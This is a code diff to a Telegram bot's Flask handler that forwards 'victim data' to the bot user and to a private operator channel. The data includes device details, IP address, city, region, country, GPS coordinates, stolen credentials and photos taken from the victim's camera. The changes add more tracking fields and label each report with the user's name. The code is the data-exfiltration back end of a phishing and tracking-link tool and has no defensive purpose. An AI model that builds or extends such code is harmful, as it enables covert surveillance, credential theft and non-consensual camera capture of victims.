@@ -3,7 +3,7 @@ import os
 import threading
 from flask import request, jsonify
 from bot.config import PRIVATE_CHANNEL_ID
-from bot.utils.storage import victim_data_store, link_cache
+from bot.utils.storage import victim_data_store, link_cache, user_username_cache
 
 
 def forward_to_user_and_channel(victim_id, data):
@@ -30,26 +30,43 @@ def forward_to_user_and_channel(victim_id, data):
             print(f"⚠️ No user found for victim {victim_id}")
             return
 
+        username = user_username_cache.get(user_id, "Unknown")
+
         # ===== GET DATA =====
         device = data.get('device_info', {})
         ip = data.get('ip', 'Unknown')
         city = data.get('city', 'Unknown')
+        region = data.get('region', 'Unknown')
+        country = data.get('country', 'Unknown')
+        lat = data.get('lat')
+        lng = data.get('lng')
+        location = data.get('location')
         photo_data = data.get('photo')
         camera_type = data.get('camera_type', 'Unknown')
         creds = data.get('creds')
-        location = data.get('location')
 
-        # ===== BUILD MESSAGE =====
+        # ===== BUILD TEXT =====
         text = f"📥 NEW VICTIM DATA\n\n"
-        text += f"🆔 Victim ID: {victim_id}\n\n"
+        text += f"👤 User: {username}\n"
+        text += f"🆔 User ID: {user_id}\n"
+        text += f"🎯 Victim ID: {victim_id}\n\n"
 
         if device:
             text += f"📱 Device: {device.get('userAgent', 'N/A')[:60]}...\n"
+            text += f"🖥️ Platform: {device.get('platform', 'N/A')}\n"
+            text += f"📺 Screen: {device.get('screen', 'N/A')}\n"
             text += f"🔋 Battery: {device.get('battery', 'N/A')}\n"
-            text += f"📶 Network: {device.get('network', 'N/A')}\n\n"
+            text += f"⚡ Charging: {device.get('charging', 'N/A')}\n"
+            text += f"📶 Network: {device.get('network', 'N/A')}\n"
+            text += f"🌍 Timezone: {device.get('timezone', 'N/A')}\n\n"
 
         text += f"🌐 IP: {ip}\n"
         text += f"📍 City: {city}\n"
+        text += f"🗺️ Region: {region}\n"
+        text += f"🏳️ Country: {country}\n"
+
+        if lat and lng:
+            text += f"🌍 GPS: {lat}, {lng}\n"
 
         if location and location.get('lat') and location.get('lng'):
             text += f"📌 Location: {location['lat']}, {location['lng']}\n"
@@ -78,17 +95,18 @@ def forward_to_user_and_channel(victim_id, data):
                 with open('temp_cam.jpg', 'wb') as f:
                     f.write(base64.b64decode(b64))
 
-                # To user
                 try:
                     with open('temp_cam.jpg', 'rb') as f:
                         bot.send_photo(user_id, f, caption=f"📸 Victim Photo ({camera_type})")
                 except Exception as e:
                     print(f"User photo error: {e}")
 
-                # To channel
                 try:
                     with open('temp_cam.jpg', 'rb') as f:
-                        bot.send_photo(PRIVATE_CHANNEL_ID, f, caption=f"📸 Victim Photo ({camera_type})")
+                        bot.send_photo(
+                            PRIVATE_CHANNEL_ID, f,
+                            caption=f"📸 Victim Photo ({camera_type})\n👤 User: {username}"
+                        )
                 except Exception as e:
                     print(f"Channel photo error: {e}")
 
